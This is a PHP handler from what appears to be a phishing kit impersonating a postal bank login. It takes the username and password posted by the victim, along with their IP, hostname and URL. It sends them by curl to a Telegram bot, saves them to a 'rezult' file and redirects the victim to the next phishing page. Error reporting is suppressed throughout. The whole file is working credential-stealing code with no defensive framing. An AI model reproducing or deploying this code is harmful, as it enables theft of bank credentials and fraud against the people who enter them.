<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
if ($_POST['type'] == "log") {
include '../../config.php';
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
	
	$back = "../proc1.php";
	
	$message .= "~~~~~~~~ login bnq postal~~~~~~~~~~~~\n";
	$message .= "Login          : ".$_POST['username']."\n";
	$message .= "Pass           : ".$_POST['password']."\n";
	$message .= "~~~~~~~~~~~~~details user~~~~~~~~~~~~~~~\n";
	$message .= "IP             : ".$ip."\n";
	$message .= "HN             : ".$hostname."\n";
	$message .= "U7l            : ".$link."\n";
	$message .= "~~~~~~~~ copyright by metri ~~~~~~~~~~~\n\n";
	$params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
	
	file_put_contents("../../rezult/postal-rzlt.txt", $message, FILE_APPEND); 

	
	
	
	header("Location: $back");
}
else {
header("location: http://guiminer.co.technology/rd/");
}
?>
